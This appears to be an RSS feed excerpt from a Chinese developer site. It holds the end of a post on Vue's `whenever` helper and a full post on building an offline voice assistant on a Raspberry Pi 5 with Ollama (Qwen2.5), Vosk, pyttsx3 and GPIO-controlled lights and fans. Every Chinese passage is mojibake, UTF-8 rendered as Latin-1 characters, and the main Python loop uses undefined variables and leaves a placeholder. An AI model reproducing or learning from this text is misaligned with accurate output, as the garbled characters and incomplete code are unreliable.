<p><strong><code>cb(v, ov, onInvalidate)</code></strong>: å¦‚æœ <code>v</code> æ˜¯çœŸå€¼ï¼Œå°±è°ƒç”¨ç”¨æˆ·ä¼ å…¥çš„åŸå§‹å›è°ƒå‡½æ•° <code>cb</code>ï¼Œå¹¶æŠŠ <code>watch</code> çš„æ‰€æœ‰å‚æ•°ï¼ˆæ–°å€¼ã€æ—§å€¼ã€å¤±æ•ˆå›è°ƒï¼‰éƒ½é€ä¼ è¿‡å»ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 4. watch çš„é…ç½®å¯¹è±¡</span>
    {
      ...options,
      <span class="hljs-attr">once</span>: <span class="hljs-literal">false</span>,
    } <span class="hljs-keyword">as</span> <span class="hljs-title class_">WatchOptions</span>,
  )
</code></pre>
<p>è¿™é‡Œæ˜¯ä¼ é€’ç»™å†…éƒ¨ <code>watch</code> çš„é…ç½®å¯¹è±¡ã€‚</p>
<ul>
<li>
<p><strong><code>...options</code></strong>: å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰é…ç½®ï¼ˆå¦‚ <code>immediate</code>, <code>deep</code>ï¼‰éƒ½ä¼ é€’ç»™åº•å±‚çš„ <code>watch</code>ã€‚</p>
</li>
<li>
<p><strong><code>once: false</code></strong>: è¿™æ˜¯ä¸€ä¸ªå…³é”®çš„è¦†ç›–æ“ä½œã€‚</p>
<blockquote>
<p>âœ¨Vue 3.4+ çš„ <code>watch</code> æœ¬èº«ä¹Ÿæ”¯æŒ <code>once</code> é€‰é¡¹ã€‚ä½†æ˜¯ <code>whenever</code> çš„ <code>once</code> é€»è¾‘æ˜¯è‡ªå·±å®ç°çš„ï¼ˆä¸ºäº†é…åˆçœŸå€¼æ£€æŸ¥ï¼‰ã€‚ä¸ºäº†é˜²æ­¢ä¸ Vue å†…ç½®çš„ <code>once</code> è¡Œä¸ºå†²çªï¼Œè¿™é‡Œå¼ºåˆ¶å°†ä¼ é€’ç»™ <code>watch</code> çš„ <code>once</code> é€‰é¡¹è®¾ç½®ä¸º <code>false</code>ï¼Œç¡®ä¿ <code>whenever</code> è‡ªå·±çš„ <code>once</code> é€»è¾‘èƒ½å¤Ÿæ­£å¸¸å·¥ä½œã€‚</p>
</blockquote>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 5. è¿”å› stop å‡½æ•°</span>
  <span class="hljs-keyword">return</span> stop
}
</code></pre>
<p>æœ€åï¼Œå°†å†…éƒ¨ <code>watch</code> è¿”å›çš„ <code>stop</code> å‡½æ•°è¿”å›ç»™è°ƒç”¨è€…ï¼Œè®©ç”¨æˆ·å¯ä»¥éšæ—¶æ‰‹åŠ¨åœæ­¢ä¾¦å¬ã€‚</p>
<h4 data-id="heading-21">æ€»ç»“</h4>
<ol>
<li><strong><code>computed</code></strong> æ˜¯ä¸ºäº†<strong>è®¡ç®—</strong>å‡ºä¸€ä¸ªæ–°å€¼ã€‚</li>
<li><strong><code>watch</code></strong> æ˜¯ä¸ºäº†åœ¨æ•°æ®å˜åŒ–æ—¶<strong>åšäº‹</strong>ã€‚</li>
<li><strong><code>whenever</code></strong> æ˜¯ <code>watch</code> çš„ä¸€ä¸ªå˜ç§ï¼Œå®ƒé€šè¿‡å·§å¦™åœ°ä½¿ç”¨ <code>nextTick</code> å’Œè¦†ç›– <code>once</code> é€‰é¡¹ï¼Œå®ç°äº†è‡ªå®šä¹‰çš„ã€ä¸çœŸå€¼åˆ¤æ–­ç›¸ç»“åˆçš„â€œæ‰§è¡Œä¸€æ¬¡â€åŠŸèƒ½ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ ‘è“æ´¾5 + æœ¬åœ°å¤§æ¨¡å‹(Qwen) + ç¦»çº¿è¯­éŸ³ = æ‰“é€ æ¯«ç§’çº§â€œè´¾ç»´æ–¯â€]]></title>    <link>https://juejin.cn/post/7580740782932983850</link>    <guid>https://juejin.cn/post/7580740782932983850</guid>    <pubDate>2025-12-08T03:40:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782932983850" data-draft-id="7580723992497684516" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ ‘è“æ´¾5 + æœ¬åœ°å¤§æ¨¡å‹(Qwen) + ç¦»çº¿è¯­éŸ³ = æ‰“é€ æ¯«ç§’çº§â€œè´¾ç»´æ–¯â€"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2025-12-08T03:40:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1æ–°1"/> <meta itemprop="url" content="https://juejin.cn/user/731600396233483"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ ‘è“æ´¾5 + æœ¬åœ°å¤§æ¨¡å‹(Qwen) + ç¦»çº¿è¯­éŸ³ = æ‰“é€ æ¯«ç§’çº§â€œè´¾ç»´æ–¯â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/731600396233483/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1æ–°1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:40:27.000Z" title="Mon Dec 08 2025 03:40:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸš€ å‰è¨€ï¼šä¸ºä»€ä¹ˆè¦æâ€œçº¯ç¦»çº¿â€ï¼Ÿ</h2>
<p>æœ€è¿‘å…¥æ‰‹äº† <strong>æ ‘è“æ´¾ 5 (8GB)</strong> ï¼Œæ€§èƒ½ç¡®å®å¼ºæ‚ã€‚ä¹‹å‰è¯•è¿‡ç”¨å„ç§åœ¨çº¿ API åšè¯­éŸ³åŠ©æ‰‹ï¼Œè¯¦æƒ…è§ï¼š<a href="https://juejin.cn/post/7579553111472767030" target="_blank" title="https://juejin.cn/post/7579553111472767030">DeepSeek R1 å¡è¿›æ ‘è“æ´¾ï¼Ÿæˆ‘ç”¨ 8GB å†…å­˜æ‰“é€ äº†ç¦»çº¿ AIoT ä¸­æ§ï¼ˆæ¶æ„ç¯‡ï¼‰ - æ˜é‡‘</a></p>
<p>è™½ç„¶æ™ºèƒ½ï¼Œä½†æœ‰ä¸¤ä¸ªç—›ç‚¹ï¼š</p>
<ol>
<li><strong>å»¶è¿Ÿé«˜</strong>ï¼šè¯´å¥è¯è¦ç­‰äº‘ç«¯è½¬åœˆåœˆï¼Œä½“éªŒå¾ˆå·®ã€‚</li>
<li><strong>ä¾èµ–ç½‘ç»œ</strong>ï¼šæ–­ç½‘å°±å˜æ™ºéšœï¼Œè€Œä¸” API è¿˜è¦é’±ï¼ˆæˆ–ç”±äºç½‘ç»œåŸå› è¿ä¸ä¸Šï¼‰ã€‚</li>
</ol>
<p>æ—¢ç„¶æ ‘è“æ´¾ 5 æ€§èƒ½è¿™ä¹ˆå¼ºï¼Œèƒ½ä¸èƒ½åšä¸€ä¸ª<strong>å®Œå…¨æ–­ç½‘ã€æ¯«ç§’çº§å“åº”ã€è¿˜èƒ½æ§åˆ¶ç¡¬ä»¶</strong>çš„â€œçœŸÂ·è´¾ç»´æ–¯â€ï¼Ÿ</p>
<p>ç»è¿‡å‡ å¤©çš„æŠ˜è…¾ï¼ˆå’Œæ— æ•°æ¬¡æŠ¥é”™ï¼‰ï¼Œæˆ‘ç»ˆäºæå®šäº†ï¼è¿™å¥—æ–¹æ¡ˆé›†æˆäº† <strong>Ollama (Qwen 2.5)</strong> åšå¤§è„‘ï¼Œ<strong>Vosk</strong> åšç¦»çº¿å¬è§‰ï¼Œ<strong>pyttsx3</strong> åšç¦»çº¿å‘å£°ï¼Œè¿˜èƒ½é€šè¿‡ <strong>GPIO</strong> æ§åˆ¶å®¶é‡Œçš„ç¯å’Œé£æ‰‡ã€‚</p>
<p>ä»Šå¤©å°±æŠŠè¿™å¥—<strong>å…¨é“¾è·¯ç¦»çº¿ AIoT</strong> æ–¹æ¡ˆåˆ†äº«ç»™å¤§å®¶ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹é‚£äº›è®©æˆ‘å¤´ç§ƒçš„å‘ã€‚</p>
<h2 data-id="heading-1">ğŸ› ï¸ ç¡¬ä»¶æ¸…å•</h2>
<ul>
<li>
<p><strong>ä¸»æ¿</strong>ï¼šRaspberry Pi 5 (8GB) â€”â€” è·‘å¤§æ¨¡å‹å†…å­˜è¶Šå¤§è¶Šå¥½ã€‚</p>
</li>
<li>
<p><strong>å¬è§‰</strong>ï¼šUSB å…¨å‘éº¦å…‹é£</p>
</li>
<li>
<p><strong>å‘å£°</strong>ï¼šUSB è¿·ä½ éŸ³ç®±</p>
<ul>
<li><em>æ³¨æ„ï¼šæ ‘è“æ´¾ 5 å–æ¶ˆäº† 3.5mm è€³æœºå­”ï¼Œå¿…é¡»ç”¨ USB å£°å¡æˆ– HDMI éŸ³é¢‘ï¼</em></li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡Œ</strong>ï¼šLED ç¯ç  (GPIO 17) + æ•£çƒ­é£æ‰‡ (GPIO 27)</p>
</li>
</ul>
<h2 data-id="heading-2">ğŸ§  æŠ€æœ¯æ¶æ„ï¼šå¦‚ä½•å®ç°æ¯«ç§’çº§å“åº”ï¼Ÿ</h2>
<p>ä¸ºäº†è¿½æ±‚æè‡´é€Ÿåº¦ï¼Œæˆ‘æ”¾å¼ƒäº†åºå¤§çš„ SpeechRecognition + Google API æ–¹æ¡ˆï¼Œè½¬è€Œé‡‡ç”¨å…¨ç¦»çº¿æ¶æ„ï¼š</p>
<ol>
<li><strong>è€³æœµ (STT)</strong> ï¼šä½¿ç”¨ <strong>Vosk</strong> ç¦»çº¿æ¨¡å‹ã€‚40MB çš„è½»é‡çº§ä¸­æ–‡æ¨¡å‹ï¼Œåœ¨ Pi 5 ä¸Šè¯†åˆ«å‡ ä¹æ˜¯ç¬æ—¶çš„ã€‚</li>
<li><strong>å¤§è„‘ (LLM)</strong> ï¼šéƒ¨ç½² <strong>Ollama</strong> è¿è¡Œ <strong>Qwen2.5:1.5b</strong>ã€‚15äº¿å‚æ•°çš„æ¨¡å‹åœ¨ Pi 5 ä¸Šæ¨ç†é€Ÿåº¦æå¿«ï¼Œå®Œå…¨æ»¡è¶³æŒ‡ä»¤ç†è§£éœ€æ±‚ã€‚</li>
<li><strong>å˜´å·´ (TTS)</strong> ï¼šä½¿ç”¨ <strong>pyttsx3 + espeak</strong>ã€‚è™½ç„¶å£°éŸ³æœ‰ç‚¹æœºæ¢°æ„Ÿï¼Œä½†èƒœåœ¨ 0 å»¶è¿Ÿï¼Œä¸ç”¨ç­‰ Azure/OpenAI çš„ç”Ÿæˆæ—¶é—´ã€‚</li>
<li><strong>å…œåº•æœºåˆ¶ (å…³é”®)</strong> ï¼šä¸ºäº†é˜²æ­¢å°æ¨¡å‹å¶å°”â€œæŠ½é£â€ï¼ˆä¸è¿”å› JSONï¼‰ï¼Œæˆ‘åŠ å…¥äº†ä¸€å±‚<strong>è§„åˆ™å¼•æ“å…œåº•</strong>ï¼Œç¡®ä¿æ§åˆ¶æŒ‡ä»¤ 100% æ‰§è¡Œã€‚</li>
</ol>
<h2 data-id="heading-3">ğŸ’£ è¸©å‘å®å½•ï¼ˆé‡ç‚¹ï¼ï¼‰</h2>
<p>è¿™ä¸€è·¯èµ°æ¥å…¨æ˜¯å‘ï¼Œå¸Œæœ›èƒ½å¸®å¤§å®¶é¿é›·ï¼š</p>
<h3 data-id="heading-4">ğŸ•³ï¸ å‘ä¸€ï¼šTTS åªæœ‰ç”µæµå£°æˆ–æŠ¥é”™ <code>Error 524</code></h3>
<p><strong>ç°è±¡</strong>ï¼šä»£ç è¿è¡Œæ­£å¸¸ï¼Œæ—¥å¿—æ˜¾ç¤º <code>Jarvis: ç³»ç»Ÿä¸Šçº¿</code>ï¼Œä½†éŸ³ç®±æ²¡å£°éŸ³ï¼Œæˆ–è€…æŠ¥é”™ <code>Unknown error 524</code>ã€‚ <strong>åŸå› </strong>ï¼š</p>
<ol>
<li>æ ‘è“æ´¾ 5 é»˜è®¤éŸ³é¢‘èµ° HDMIï¼Œä¸”ç§»é™¤äº† 3.5mm æ¥å£ã€‚</li>
<li><code>pyttsx3</code> ç”Ÿæˆçš„æ˜¯å•å£°é“éŸ³é¢‘ï¼Œè€Œæˆ‘çš„ USB å£°å¡åªåƒç«‹ä½“å£°ï¼Œå¯¼è‡´ ALSA é©±åŠ¨å±‚æ‹’ç»æ’­æ”¾ (<code>Channels count non available</code>)ã€‚</li>
<li>éº¦å…‹é£å½•éŸ³å’Œ TTS æ’­æ”¾åŒæ—¶è¿›è¡Œï¼Œå¯¼è‡´å£°å¡èµ„æºå†²çªã€‚</li>
</ol>
<p><strong>âœ… è§£å†³</strong>ï¼š é…ç½® <code>~/.asoundrc</code> æ–‡ä»¶ï¼Œä½¿ç”¨ <code>plug</code> æ’ä»¶è‡ªåŠ¨è½¬æ¢æ ¼å¼ï¼Œå¹¶å¼ºåˆ¶ç»‘å®š USB å£°å¡ (Card 2)ã€‚</p>
<pre><code class="hljs language-#" lang="#">pcm.!default {
    type plug
    slave {
        pcm "hw:2,0"  # 2æ˜¯æˆ‘çš„USBå£°å¡ç¼–å·ï¼Œç”¨ aplay -l æŸ¥çœ‹
    }
}
ctl.!default {
    type hw
    card 2
}
</code></pre>
<h3 data-id="heading-5">ğŸ•³ï¸ å‘äºŒï¼šè´¾ç»´æ–¯è¯´â€œé¸Ÿè¯­â€ (Chinese lite?)</h3>
<p><strong>ç°è±¡</strong>ï¼šæ˜æ˜ç»™ä»–å‘çš„æ˜¯ä¸­æ–‡æ–‡æœ¬ï¼Œå®ƒè¯»å‡ºæ¥å…¨æ˜¯ä¹±ç è‹±æ–‡å‘éŸ³ã€‚ <strong>åŸå› </strong>ï¼š<code>pyttsx3</code> åœ¨ Linux ä¸‹é»˜è®¤è°ƒç”¨ <code>espeak</code> çš„è‹±æ–‡å¼•æ“ï¼Œä¸ä¼šè‡ªåŠ¨è¯†åˆ«ä¸­æ–‡æ–‡æœ¬ã€‚ <strong>âœ… è§£å†³</strong>ï¼šåœ¨ä»£ç åˆå§‹åŒ–æ—¶ï¼Œå¼ºåˆ¶éå†å¹¶é”å®šä¸­æ–‡è¯­éŸ³åŒ…ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è‡ªåŠ¨å¯»æ‰¾ä¸­æ–‡è¯­éŸ³åŒ…é€»è¾‘</span>
voices = engine.getProperty(<span class="hljs-string">'voices'</span>)
<span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> voices:
    <span class="hljs-keyword">if</span> <span class="hljs-string">'zh'</span> <span class="hljs-keyword">in</span> v.<span class="hljs-built_in">id</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'chinese'</span> <span class="hljs-keyword">in</span> v.name.lower():
        engine.setProperty(<span class="hljs-string">'voice'</span>, v.<span class="hljs-built_in">id</span>)
        <span class="hljs-keyword">break</span>
</code></pre>
<h3 data-id="heading-6">ğŸ•³ï¸ å‘ä¸‰ï¼šå¤§æ¨¡å‹â€œå·æ‡’â€</h3>
<p><strong>ç°è±¡</strong>ï¼šVosk å¬åˆ°äº†â€œæŠŠç¯æ‰“å¼€â€ï¼Œä½† Qwen 1.5B æœ‰æ—¶å€™æ²‰è¿·èŠå¤©ï¼Œè¿”å›çš„ JSON é‡Œ <code>device</code> æ˜¯ <code>null</code>ã€‚ <strong>âœ… è§£å†³</strong>ï¼šå¢åŠ <strong>æ··åˆé€»è¾‘ (Hybrid Logic)</strong> ã€‚ å¦‚æœ AI è¿”å›ç©ºæŒ‡ä»¤ï¼Œä»£ç ä¼šè‡ªåŠ¨æ­£åˆ™åŒ¹é…å…³é”®è¯ï¼ˆâ€œå¼€ç¯â€ã€â€œäº®â€ï¼‰ã€‚<strong>AI è´Ÿè´£èŠå¤©å’Œå¤æ‚ç†è§£ï¼Œè§„åˆ™è´Ÿè´£ä¿å‘½å…œåº•</strong>ã€‚</p>
<h2 data-id="heading-7">ğŸ’» æ ¸å¿ƒä»£ç ç§€</h2>
<p>è¿™æ˜¯æœ€ç»ˆç‰ˆçš„ <code>jarvis.py</code>ï¼Œé›†æˆäº†ä¸Šè¿°æ‰€æœ‰ä¿®å¤ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        data = stream.read(<span class="hljs-number">4000</span>, exception_on_overflow=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> rec.AcceptWaveform(data):
            result = json.loads(rec.Result())
            text = result[<span class="hljs-string">'text'</span>].replace(<span class="hljs-string">" "</span>, <span class="hljs-string">""</span>)
            
            <span class="hljs-keyword">if</span> text:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ‘‚ å¬åˆ°: <span class="hljs-subst">{text}</span>"</span>)
                <span class="hljs-comment"># å…³é”®è¯å”¤é†’ï¼Œå‡å°‘è¯¯è§¦</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(k <span class="hljs-keyword">in</span> text <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> [<span class="hljs-string">"ç¯"</span>, <span class="hljs-string">"é£æ‰‡"</span>, <span class="hljs-string">"æ‰“å¼€"</span>, <span class="hljs-string">"å…³"</span>, <span class="hljs-string">"ä½ å¥½"</span>,<span class="hljs-string">"è´¾ç»´æ–¯"</span>]):
                    <span class="hljs-comment"># 1. è¯·æ±‚ AI å¤§è„‘</span>
                    action_data = ask_ai(text)
                    
                    <span class="hljs-comment"># 2. è§„åˆ™å…œåº•æ£€æŸ¥ (é˜²æ­¢ AI çŠ¯å‚»)</span>
                    <span class="hljs-keyword">if</span> action_data.get(<span class="hljs-string">"device"</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                         <span class="hljs-comment"># ... è¿™é‡Œå†™æ­£åˆ™åŒ¹é…é€»è¾‘ ...</span>
                         <span class="hljs-keyword">pass</span>

                    <span class="hljs-comment"># 3. ç¡¬ä»¶æ‰§è¡Œ</span>
                    <span class="hljs-keyword">if</span> device == <span class="hljs-string">'light'</span>:
                        GPIO.output(PIN_LIGHT, GPIO.HIGH <span class="hljs-keyword">if</span> action == <span class="hljs-string">'on'</span> <span class="hljs-keyword">else</span> GPIO.LOW)
                    
                    <span class="hljs-comment"># 4. è¯­éŸ³åé¦ˆ</span>
                    speak(action_data.get(<span class="hljs-string">'reply'</span>))
</code></pre>
<h2 data-id="heading-8">ğŸ‰ æœ€ç»ˆæ•ˆæœ</h2>
<p>ç°åœ¨ï¼Œä¸ç®¡æ˜¯å–Šâ€œæ‰“å¼€é£æ‰‡â€ï¼Œè¿˜æ˜¯è·Ÿå®ƒé—²èŠâ€œè®²ä¸ªç¬‘è¯â€ï¼Œæ ‘è“æ´¾éƒ½èƒ½åœ¨ <strong>1ç§’å†…</strong> åšå‡ºååº”ã€‚</p>
<ul>
<li><strong>é—²èŠæ¨¡å¼</strong>ï¼šå¹½é»˜é£è¶£ã€‚</li>
<li><strong>æŒ‡ä»¤æ¨¡å¼</strong>ï¼šæŒ‡å“ªæ‰“å“ªï¼Œç¯å…‰é—ªçƒç¬é—´å“åº”ã€‚</li>
</ul>
<p>æˆåŠŸæ—¥å¿—å¦‚ä¸‹</p>
<pre><code class="hljs language-css" lang="css">æ—¥å¿—ï¼š
ğŸ¤– Jarvis: ç³»ç»Ÿå‡çº§å®Œæ¯•

ğŸ‘‚ å¬åˆ°: æ‰“å¼€é£æ‰‡

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'fan'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'on'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œé£æ‰‡å·²å¯åŠ¨'</span>}

ğŸ’¨ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> é£æ‰‡ -&gt; on

ğŸ¤– Jarvis: å¥½çš„ï¼Œé£æ‰‡å·²å¯åŠ¨

ğŸ‘‚ å¬åˆ°: æ‰“å¼€ç¯å…‰

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'light'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'on'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œç¯å…‰æ‰“å¼€äº†'</span>}

ğŸ’¡ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> ç¯ -&gt; on

ğŸ¤– Jarvis: å¥½çš„ï¼Œç¯å…‰æ‰“å¼€äº†

ğŸ‘‚ å¬åˆ°: å…³é—­ç¯å…‰

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'light'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'off'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œç¯å…‰å·²å…³é—­'</span>}

ğŸ’¡ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> ç¯ -&gt; off

ğŸ¤– Jarvis: å¥½çš„ï¼Œç¯å…‰å·²å…³é—­

ğŸ‘‚ å¬åˆ°: æ‰“å¼€é£æ‰‡

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'fan'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'on'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'é£æ‰‡å·²å¯åŠ¨'</span>}

ğŸ’¨ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> é£æ‰‡ -&gt; on

ğŸ¤– Jarvis: é£æ‰‡å·²å¯åŠ¨

ğŸ‘‚ å¬åˆ°: å…³é—­é£æ‰‡

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'fan'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'off'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œé£æ‰‡å·²ç»å…³æ‰äº†'</span>}

ğŸ’¨ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> é£æ‰‡ -&gt; off

ğŸ¤– Jarvis: å¥½çš„ï¼Œé£æ‰‡å·²ç»å…³æ‰äº†

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': None, <span class="hljs-string">'action'</span>: None, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'æˆ‘æ˜¯ä½ çš„æ™ºèƒ½ç®¡å®¶åŠ©æ‰‹ã€‚'</span>}

ğŸ¤– Jarvis: æˆ‘æ˜¯ä½ çš„æ™ºèƒ½ç®¡å®¶åŠ©æ‰‹ã€‚

ğŸ‘‚ å¬åˆ°: å¯ä»¥è®²ä¸€ä¸ªç¬‘è¯å—

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': None, <span class="hljs-string">'action'</span>: None, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å½“ç„¶äº†ï¼Œè¿™æ˜¯ä¸ªç»å…¸çš„ç¬‘è¯ã€‚ä¸ºä»€ä¹ˆæµ·æ´‹é‡Œçš„é±¼æ€»æ˜¯å–œæ¬¢èšåœ¨ä¸€èµ·ï¼Ÿå› ä¸ºå®ƒä»¬è§‰å¾—â€˜æ¸¸â€™åœ¨ä¸€èµ·æ›´æœ‰è¶£ï¼'</span>}

